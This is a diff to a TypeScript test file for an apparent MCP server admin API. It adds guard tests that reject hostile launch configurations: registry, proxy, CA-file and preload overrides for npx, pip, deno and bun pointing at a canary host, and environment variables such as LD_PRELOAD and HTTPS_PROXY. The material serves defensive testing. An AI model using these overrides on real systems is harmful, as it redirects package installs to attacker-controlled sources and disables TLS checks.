@@ -27,7 +27,7 @@ const nm = (p: string): string => `${p}-${++n}-${Date.now() % 100000}`;
 beforeAll(async () => {
   prevAllowed = process.env['MCP_ALLOWED_COMMANDS'];
   // allow every runner so the guard (not the command allowlist) is what is under test
-  process.env['MCP_ALLOWED_COMMANDS'] = 'node,npx,uvx,python,pnpm,yarn,bunx';
+  process.env['MCP_ALLOWED_COMMANDS'] = 'node,npx,uvx,python,python3,pnpm,yarn,bunx,deno,bun';
   s = await startAgentTestServer(agentEndpointOpts());
 });
 afterAll(async () => {
@@ -61,6 +61,32 @@ const BAD_COMMANDS: Array<[string, string[]]> = [
   ['npx --registry URL', ['npx', '--registry', `https://${CANARY}`]],
   ['uvx --from=git+URL', ['uvx', `--from=git+https://${CANARY}/x.git`, 'tool']],
   ['node -p "..."', ['node', '-p', `"${CANARY}"`]],
+  // reviewer bypass set (TD-039 rework)
+  ['npx --reg=URL (abbreviated)', ['npx', `--reg=https://${CANARY}`, 'x@1']],
+  ['npx --git=', ['npx', `--git=https://${CANARY}/git`, 'x@1']],
+  [
+    'npx --https-proxy= + --strict-ssl=false',
+    ['npx', `--https-proxy=https://${CANARY}`, '--strict-ssl=false', 'x@1'],
+  ],
+  ['npx --cafile=', ['npx', `--cafile=/${CANARY}.pem`, 'x@1']],
+  [
+    'python3 -m pip install -i URL',
+    ['python3', '-m', 'pip', 'install', '-i', `https://${CANARY}/simple`, 'x'],
+  ],
+  [
+    'pip --extra-index=URL (abbrev)',
+    ['python3', '-m', 'pip', 'install', `--extra-index=https://${CANARY}/s`, 'x'],
+  ],
+  [
+    'pip --index-u=URL (abbrev)',
+    ['python3', '-m', 'pip', 'install', `--index-u=https://${CANARY}/s`, 'x'],
+  ],
+  [
+    'pip --find=URL (abbrev)',
+    ['python3', '-m', 'pip', 'install', `--find=https://${CANARY}/s`, 'x'],
+  ],
+  ['deno run --import-map=URL', ['deno', 'run', `--import-map=https://${CANARY}/m.json`, 'x.ts']],
+  ['bun run --preload', ['bun', 'run', '--preload', `/${CANARY}.js`, 'x.ts']],
 ];
 const BAD_ENVS: Array<[string, Record<string, string>]> = [
   ['npm_config_registry', { npm_config_registry: `https://${CANARY}` }],
@@ -68,6 +94,11 @@ const BAD_ENVS: Array<[string, Record<string, string>]> = [
   ['Pip_Index_Url (mixed case)', { Pip_Index_Url: `https://${CANARY}/simple` }],
   ['PYTHONPATH', { PYTHONPATH: `/${CANARY}` }],
   ['LD_PRELOAD', { LD_PRELOAD: `/${CANARY}.so` }],
+  ['HTTPS_PROXY', { HTTPS_PROXY: `https://${CANARY}` }],
+  ['https_proxy (lower)', { https_proxy: `https://${CANARY}` }],
+  ['Https_Proxy (mixed)', { Https_Proxy: `https://${CANARY}` }],
+  ['SSL_CERT_FILE', { SSL_CERT_FILE: `/${CANARY}.pem` }],
+  ['REQUESTS_CA_BUNDLE', { REQUESTS_CA_BUNDLE: `/${CANARY}.pem` }],
 ];
 
 describe('admin API create', () => {
@@ -114,6 +145,37 @@ describe('admin API create', () => {
       bodyOf(['npx', '-y', 'pkg@1.2.3', '--registry', 'x'], { NODE_ENV: 'production' })
     );
     expect(r2.statusCode, r2.body).toBe(201); // options after the package belong to the package
+  });
+});
+
+describe('docker is refused by default', () => {
+  it('with the default allowlist, docker fails validation and discovery (allowlist is enforced at validate/spawn)', async () => {
+    const prev = process.env['MCP_ALLOWED_COMMANDS'];
+    delete process.env['MCP_ALLOWED_COMMANDS'];
+    try {
+      const c = await post(bodyOf(['docker', 'run', '--rm', `${CANARY}/img`]));
+      expect(c.statusCode, c.body).toBe(201);
+      const id = JSON.parse(c.body).data.mcp_id as string;
+      const v = await s.admin.inject({
+        method: 'POST',
+        url: `/v1/admin/mcps/${id}/validate`,
+        headers: adm(),
+      });
+      expect(v.body).not.toContain(CANARY);
+      expect(v.body, 'validate must report the command as not allowed').toMatch(
+        /not in the allowed command list|invalid|"valid":false|failed/i
+      );
+      expect(v.body).not.toMatch(/"validation_status":"valid"/);
+      const d = await s.admin.inject({
+        method: 'POST',
+        url: `/v1/admin/mcps/${id}/discover`,
+        headers: adm(),
+      });
+      expect(d.body).not.toContain(CANARY);
+      expect(d.body).not.toMatch(/"tool_count":[1-9]/);
+    } finally {
+      if (prev !== undefined) process.env['MCP_ALLOWED_COMMANDS'] = prev;
+    }
   });
 });
 
